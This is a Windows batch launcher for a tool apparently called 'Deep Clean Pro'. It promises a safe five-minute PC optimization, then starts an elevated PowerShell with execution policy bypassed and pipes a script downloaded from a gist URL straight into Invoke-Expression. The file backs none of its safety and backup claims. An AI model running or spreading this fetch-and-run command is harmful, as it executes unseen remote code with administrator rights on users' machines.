@echo off
title Deep Clean Pro - Quick Fix (5 minutes)
color 0A
cls

echo ========================================================
echo          DEEP CLEAN PRO - QUICK FIX MODE
echo ========================================================
echo.
echo This will quickly optimize your PC in about 5 minutes.
echo It's completely safe and creates backups.
echo.
echo Press any key to start optimization...
pause > nul

echo.
echo [1/3] Starting PowerShell as Administrator...
echo.

PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command \"irm ''https://gist.githubusercontent.com/Dr-Diodac/25787f26b3506573bd4df4c42d1ffce7/raw/DeepCleanPro-Launcher.ps1'' | iex\"' -Verb RunAs}"

echo.
echo ========================================================
echo Deep Clean Pro is now running in a new window!
echo.
echo When finished, your PC will run much faster!
echo ========================================================
echo.
echo Press any key to close this window...
pause > nul